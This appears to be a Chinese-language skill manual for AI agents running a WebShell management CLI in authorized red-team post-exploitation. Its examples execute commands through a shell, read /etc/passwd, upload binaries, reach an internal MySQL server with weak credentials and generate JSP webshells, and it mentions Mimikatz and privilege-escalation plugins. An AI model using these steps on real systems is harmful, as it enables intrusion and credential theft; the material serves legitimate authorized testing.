---
name: pentest-gsl5
description: GSL5 CLI（WebShell 管理与红队后渗透）操作手册：task 隔离、命令词汇、退出码、大文件纪律、审计与代理。
whenToUse: 涉及 WebShell 管理、命令执行、文件上传下载、经壳连内网数据库的授权测试任务时加载。
priority: high
alwaysApply: false
---

# GSL5 CLI 工具手册

> 权威手册即本文件（`{BASE}/SKILL.md`）。语法以 `gsl5 --help`、参数以 `gsl5 tools <tool>` 实时输出为准——**skill 不复制参数级文档**，上游升级自动跟上。

## 何时用 / 怎么想

- 拿到 WebShell 入口（手工利用获取 JSP/ASPX/PHP 壳）后，用 `shell_add` 注册进某个 task，由 CLI 统一接管命令执行/文件/数据库操作。
- 一个任务（engagement）= 一个 `--task` 名 = 一个隔离 data.db；**临时/人工调试可省略 `--task`（落 `default`），正式任务必须显式命名**；同一任务的多 agent 共享同一 task（复用 shell 列表），跨任务天然隔离。

## 语法与约定

```bash
gsl5 [--task NAME] [--format json|text] [--timeout SEC] <command> [--flags]
```

- stdout **恰好一行 JSON**：成功 `{"ok":true,"task":...,"tool":...,"text"/业务字段}`；失败 `{"ok":false,"error":...}`。日志全部走 stderr。
- **退出码**：`0` 成功 / `2` 用法错误（含缺必填 flag）/ `3` 目标连接或执行失败 / `4` 超时 / `5` task 写锁竞争。
- 默认超时 120s；Mimikatz、大文件等长任务用 `--timeout 600` 放宽。
- 首次使用某 task：wrapper 自动建 `<tasks-root>/<task>/`（data.db 首用即建）。

## 常用命令（L2 高频；完整清单 `gsl5 --help`）

```bash
gsl5 --task T shell_list                      # 列 shell
gsl5 --task T shell_add --url URL --password P --secretKey K --payload JavaDynamicPayload --cryption JAVA_AES_BASE64
gsl5 --task T shell_info --shellId ID         # 探活+系统信息（encoding 自动探测写回）
gsl5 --task T shell_exec --shellId ID --command 'id' [--encoding auto]
gsl5 --task T file_download_local --shellId ID --remotePath /etc/passwd --out ./passwd   # 大文件直存本地
gsl5 --task T file_upload_local --shellId ID --file ./tool.elf --remotePath /tmp/tool.elf
gsl5 --task T db_connect --shellId ID --target '172.31.0.20 3306 root 123456 mysql' --configName C
gsl5 --task T db_exec --shellId ID --sql 'select version();' --execType select
gsl5 --task T shell_create --payload JavaDynamicPayload --cryption JAVA_AES_BASE64 --genFile ./shell.jsp
```

## 长尾能力（不进 skill 正文）

`file_search/net_info/process_list/c2profile_*/shell_clone/backup/env/...` 及全部插件工具
（提权 TH_TOOLS、Mimikatz、杀软识别、OA 专项等 ~10 个）一律：

1. `gsl5 tools [关键词]` 查目录；2. `gsl5 tools <tool-name>` 看参数；3. `gsl5 call <tool-name> --json '{...}'` 调用。

## 纪律（违反即返工）

1. **大文件**：`file_download_local --out` / `file_upload_local --file` 直存直传，禁止把文件内容读进上下文；`--json` 内嵌 base64 仅限小内容。
2. **代理**：出口代理是 Shell 属性——`shell_add/shell_edit --proxyType HTTP|SOCKS --proxyHost H --proxyPort P`（改后自动生效）；`NO_PROXY`/`GLOBAL_PROXY` 语义见 `tools shell_add`。环境变量代理不受支持。
3. **审计**：每条命令自动落账到 `<task>/logs/operation_audit.db`；多 agent 协作回溯靠它，禁止绕过。
4. **task 卫生**：禁止把凭据写进 skill/文档；任务结束清理 task 目录并在任务记录留痕。
5. **编码**：目标回显乱码时用 `--encoding auto`（自动探测写回 DB），勿盲目 GBK/UTF-8 硬试。

## 实验室验收

见仓库 `AGENTS.md` §4.1（TC1 Tomcat CVE-2017-12615 → CLI 接管；TC2 经壳连内网 MySQL 弱口令）。仅限授权实验室执行。
